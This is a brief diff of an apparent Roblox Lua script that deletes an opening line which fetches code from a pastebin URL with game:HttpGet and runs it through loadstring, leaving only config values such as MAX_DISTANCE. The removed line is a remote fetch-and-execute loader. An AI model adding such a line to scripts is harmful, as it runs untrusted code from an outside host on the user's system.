@@ -1,7 +1,3 @@
-loadstring(game:HttpGet("https://pastebin.com/raw/fMU975VL"))()
-
-wait(0.1)
-
 --// ================= CONFIG =================
 local MAX_DISTANCE = 9999
 local UPDATE_RATE = 2
